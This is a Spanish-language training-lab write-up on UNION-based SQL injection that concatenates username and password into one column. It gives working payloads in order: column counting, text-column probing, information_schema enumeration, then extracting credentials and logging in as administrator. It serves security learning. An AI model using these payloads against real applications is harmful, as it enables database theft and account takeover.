# 6. Múltiples Valores en una sola Columna con UNION

## 💉 Ataque UNION: múltiples valores en una sola columna

### 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **inyección SQL** en el filtro de categorías de productos. La aplicación permite recuperar datos mediante un ataque **UNION SELECT**.

La base de datos contiene una tabla `users` con los campos `username` y `password`. Sin embargo, solo una columna de la consulta original acepta datos de tipo texto.

El objetivo es concatenar ambos valores en una sola columna para extraer las credenciales y utilizarlas para iniciar sesión como el usuario `administrator`.

***

### 📚 Teoría

#### 📌 Concatenación de múltiples valores en una sola columna

En algunos escenarios de SQL Injection, la consulta original solo permite insertar datos en una única columna compatible con texto.

En este caso, no es posible devolver `username` y `password` en columnas separadas porque una de ellas no acepta texto. Para solucionar esto se utiliza **concatenación de cadenas**.

Ejemplo conceptual:

```
username || ':' || password
```

Esto permite unir ambos valores en una única cadena, separándolos con un carácter identificador como `:` o `~`.

Si la consulta original tiene una estructura similar a:

```sql
SELECT column1, column2 FROM products WHERE category = 'Gifts'
```

el ataque consiste en:

1. Determinar el número de columnas con `ORDER BY`.
2. Identificar qué columna acepta texto.
3. Concatenar `username` y `password` en una sola columna.
4. Mostrar los resultados en la respuesta de la aplicación.

***

### 📝 Práctica

#### 1️⃣ Determinar el número de columnas

Interceptamos la petición del filtro de categorías y la enviamos a **Burp Repeater**.

Probamos con `ORDER BY`:

```
/filter?category=' ORDER BY 1--
/filter?category=' ORDER BY 2--
/filter?category=' ORDER BY 3--
```

Resultados:

```
ORDER BY 1 → funciona
ORDER BY 2 → funciona
ORDER BY 3 → error
```

Conclusión: la consulta devuelve **2 columnas**.

<figure><img src="../../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

***

#### 2️⃣ Identificar qué columna acepta texto

Probamos un ataque UNION básico:

```
/filter?category=' UNION SELECT NULL,'test'--
```

<figure><img src="../../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

Resultado:

La respuesta muestra una fila adicional con el valor **test**.

Esto confirma que **la segunda columna acepta texto**.

***

#### 3️⃣ Enumerar las bases de datos

Listamos los esquemas disponibles:

```
/filter?category=' UNION SELECT NULL,schema_name FROM information_schema.schemata--
```

<figure><img src="../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

Entre los resultados aparece el esquema **public**, que normalmente contiene las tablas de la aplicación.

***

#### 4️⃣ Enumerar las tablas del esquema

Consultamos las tablas dentro del esquema `public`:

```
/filter?category=' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='public'--
```

<figure><img src="../../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

La respuesta incluye las tablas:

```
users
products
```

***

#### 5️⃣ Enumerar las columnas de la tabla users

Ahora listamos las columnas de la tabla `users`:

```
/filter?category=' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'--
```

<figure><img src="../../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

Resultado:

```
username
password
```

***

#### 6️⃣ Extraer usuarios y contraseñas

Construimos el payload final concatenando ambas columnas:

```
/filter?category=' UNION SELECT NULL,username||':'||password FROM users--
```

<figure><img src="../../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

La respuesta muestra una lista de credenciales, por ejemplo:

```
administrator:password123
```

***

#### 7️⃣ Iniciar sesión como administrador

Accedemos al formulario de login de la aplicación e introducimos:

```
Username: administrator
Password: password123
```

La autenticación es exitosa y accedemos como administrador.

<figure><img src="../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

***

#### 8️⃣ Resultado

Mediante el ataque UNION se ha conseguido:

* Determinar el número de columnas de la consulta.
* Identificar qué columna acepta datos de tipo texto.
* Enumerar esquemas, tablas y columnas.
* Extraer credenciales de la tabla `users`.
* Autenticarse como el usuario `administrator`.

✅ El laboratorio se marca como completado.
